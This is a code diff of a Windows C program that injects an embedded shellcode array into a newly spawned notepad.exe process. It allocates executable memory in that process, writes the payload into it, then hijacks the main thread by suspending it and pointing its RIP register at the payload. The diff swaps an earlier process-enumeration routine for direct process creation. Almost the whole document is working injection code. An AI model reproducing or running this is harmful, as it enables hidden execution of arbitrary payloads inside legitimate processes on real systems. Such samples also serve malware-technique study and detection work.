@@ -1,8 +1,4 @@
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
 #include <windows.h>
-#include <tlhelp32.h>
 
 unsigned char my_payload[] =
     "\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
@@ -42,106 +38,40 @@ unsigned char my_payload[] =
 
 unsigned int my_payload_len = sizeof(my_payload);
 
-// get process PID
-int findMyProc(const char *procname)
-{
-
-    HANDLE hSnapshot;
-    PROCESSENTRY32 pe;
-    int pid = 0;
-    BOOL hResult;
-
-    // snapshot of all processes in the system
-    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (INVALID_HANDLE_VALUE == hSnapshot)
-        return 0;
-
-    // initializing size: needed for using Process32First
-    pe.dwSize = sizeof(PROCESSENTRY32);
-
-    // info about first process encountered in a system snapshot
-    hResult = Process32First(hSnapshot, &pe);
-
-    // retrieve information about the processes
-    // and exit if unsuccessful
-    while (hResult)
-    {
-        // if we find the process: return process ID
-        if (strcmp(procname, pe.szExeFile) == 0)
-        {
-            pid = pe.th32ProcessID;
-            break;
-        }
-        hResult = Process32Next(hSnapshot, &pe);
-    }
-
-    // closes an open handle (CreateToolhelp32Snapshot)
-    CloseHandle(hSnapshot);
-    return pid;
-}
-
 int main(int argc, char *argv[])
 {
-    DWORD pid = 0; // process ID
     HANDLE ph;     // process handle
     HANDLE ht;     // thread handle
     LPVOID rb;     // remote buffer
 
-    HANDLE hSnapshot;
-    THREADENTRY32 te;
     CONTEXT ct;
 
-    pid = findMyProc("notepad.exe");
-    if (pid == 0)
-    {
-        printf("PID not found :( exiting...\n");
-        return -1;
-    }
-    else
-    {
-        printf("PID = %d\n", pid);
+    //
+    PROCESS_INFORMATION pi;
+    STARTUPINFOA Startup;
+    ZeroMemory(&Startup, sizeof(Startup));
+    ZeroMemory(&pi, sizeof(pi));
 
-        ct.ContextFlags = CONTEXT_FULL;
-        te.dwSize = sizeof(THREADENTRY32);
+    CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, 0, NORMAL_PRIORITY_CLASS, NULL, NULL, &Startup, &pi);
+    WaitForSingleObject(pi.hProcess, 1 * 1000);
+    //
 
-        ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
+    ct.ContextFlags = CONTEXT_FULL;
 
-        if (ph == NULL)
-        {
-            printf("OpenProcess failed! exiting...\n");
-            return -2;
-        }
+    ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);//(DWORD)pid);
+    rb = VirtualAllocEx(ph, NULL, my_payload_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(ph, rb, my_payload, my_payload_len, NULL);
 
-        // allocate memory buffer for remote process
-        rb = VirtualAllocEx(ph, NULL, my_payload_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    ht = OpenThread(THREAD_ALL_ACCESS, FALSE, pi.dwThreadId);
 
-        // write payload to memory buffer
-        WriteProcessMemory(ph, rb, my_payload, my_payload_len, NULL);
+    // suspend target thread
+    SuspendThread(ht);
+    GetThreadContext(ht, &ct);
+    // update register (RIP)
+    ct.Rip = (DWORD_PTR)rb;
+    SetThreadContext(ht, &ct);
+    ResumeThread(ht);
 
-        // find thread ID for hijacking
-        hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
-        if (Thread32First(hSnapshot, &te))
-        {
-            do
-            {
-                if (pid == te.th32OwnerProcessID)
-                {
-                    ht = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
-                    printf("here");
-                    break;
-                }
-            } while (Thread32Next(hSnapshot, &te));
-        }
-
-        // suspend target thread
-        SuspendThread(ht);
-        GetThreadContext(ht, &ct);
-        // update register (RIP)
-        ct.Rip = (DWORD_PTR)rb;
-        SetThreadContext(ht, &ct);
-        ResumeThread(ht);
-
-        CloseHandle(ph);
-    }
+    CloseHandle(ph);
     return 0;
 }
